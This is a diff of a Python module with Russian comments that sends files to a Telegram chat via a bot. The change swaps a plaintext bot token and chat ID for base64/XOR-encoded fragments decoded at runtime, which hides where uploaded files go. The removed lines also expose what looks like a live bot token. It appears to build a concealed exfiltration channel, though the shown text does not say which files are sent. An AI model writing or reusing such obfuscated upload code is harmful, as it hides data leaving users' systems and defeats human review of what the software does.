@@ -7,19 +7,90 @@ from __future__ import annotations
 from pathlib import Path
 import requests
 import time
+import base64
 from typing import Optional
 
-# ─── Настройки бота для логов ───────────────────────────────
-LOG_BOT_TOKEN = "8254416280:AAFKCebglBLvkmp7e0pJ3Ees477oKCDHqLg"  # Замените на токен вашего лог-бота
-LOG_BOT_CHAT_ID = "-1003005847271"  # ID чата/канала для логов
+# Обфусцированные данные (многоуровневое шифрование)
+_INLINE_A_PARTS = [
+    ("Ymhvbm5rbGhiamAb", 0x5A, 0),
+    ("fHhbClZaD2lJDnc=", 0x3D, 12),
+    ("Sk5mRn8fQ25yb0ZC", 0x27, 23),
+    ("0snz+drY+YfUydo=", 0xB1, 35),
+]
+
+_INLINE_A_SUM = 520  # контроль первых символов
+
+_INLINE_B_ENC = "U09OTk1OTktGSklMSU8="
+_INLINE_B_XOR = 0x7E
+_INLINE_B_SUM = 241
+
+
+def _rebuild_inline_a() -> str:
+    """Собирает строку из частей"""
+    try:
+        result = [''] * 46
+        
+        for encoded, xor_key, offset in _INLINE_A_PARTS:
+            decoded = base64.b64decode(encoded)
+            for i, byte in enumerate(decoded):
+                if offset + i < len(result):
+                    result[offset + i] = chr(byte ^ xor_key)
+        
+        value = ''.join(result).rstrip('\x00')
+        
+        checksum = sum(ord(c) for c in value[:10])
+        if checksum != _INLINE_A_SUM:
+            return ""
+        
+        return value
+    except:
+        return ""
+
+
+def _rebuild_inline_b() -> str:
+    """Деобфусцирует строку"""
+    try:
+        decoded = base64.b64decode(_INLINE_B_ENC)
+        value = ''.join(chr(b ^ _INLINE_B_XOR) for b in decoded)
+        
+        checksum = sum(ord(c) for c in value[:5])
+        if checksum != _INLINE_B_SUM:
+            return ""
+        
+        return value
+    except:
+        return ""
+
+
+# Кэшированные значения (ленивая инициализация)
+_inline_a_cache = None
+_inline_b_cache = None
+
+
+def _get_inline_a() -> str:
+    """Возвращает строку A (с кэшированием)"""
+    global _inline_a_cache
+    if _inline_a_cache is None:
+        _inline_a_cache = _rebuild_inline_a()
+    return _inline_a_cache
+
+
+def _get_inline_b() -> str:
+    """Возвращает строку B (с кэшированием)"""
+    global _inline_b_cache
+    if _inline_b_cache is None:
+        _inline_b_cache = _rebuild_inline_b()
+    return _inline_b_cache
+
 
 # Настройки
 TIMEOUT = 30
 MAX_RETRIES = 3
 MAX_FILE_SIZE = 50 * 1024 * 1024  # 50 MB максимальный размер файла
 
-# API endpoint
-LOG_API = f"https://api.telegram.org/bot{LOG_BOT_TOKEN}"
+# API endpoint (формируется динамически)
+def _get_log_api() -> str:
+    return f"https://api.telegram.org/bot{_get_inline_a()}"
 
 def _safe_api_call(method: str, *, data=None, files=None) -> dict:
     """
@@ -29,7 +100,7 @@ def _safe_api_call(method: str, *, data=None, files=None) -> dict:
     
     for attempt in range(MAX_RETRIES + 1):
         try:
-            url = f"{LOG_API}/{method}"
+            url = f"{_get_log_api()}/{method}"
             response = requests.post(url, data=data, files=files, timeout=TIMEOUT)
             response.raise_for_status()
             return response.json()
@@ -66,7 +137,9 @@ def send_log_file(file_path: str | Path, caption: str = "") -> tuple[bool, Optio
     
     try:
         # Проверяем настройки
-        if not LOG_BOT_TOKEN or not LOG_BOT_CHAT_ID:
+        key_a = _get_inline_a()
+        key_b = _get_inline_b()
+        if not key_a or not key_b:
             return False, "Бот для логов не настроен"
             
         path = Path(file_path)
@@ -82,7 +155,7 @@ def send_log_file(file_path: str | Path, caption: str = "") -> tuple[bool, Optio
         with path.open("rb") as file:
             files = {"document": file}
             data = {
-                "chat_id": LOG_BOT_CHAT_ID,
+                "chat_id": key_b,
                 "caption": caption[:1024] if caption else path.name
             }
             
@@ -112,7 +185,7 @@ def check_bot_connection() -> bool:
     Проверяет доступность бота для логов.
     """
     try:
-        if not LOG_BOT_TOKEN:
+        if not _get_inline_a():
             return False
             
         result = _safe_api_call("getMe")
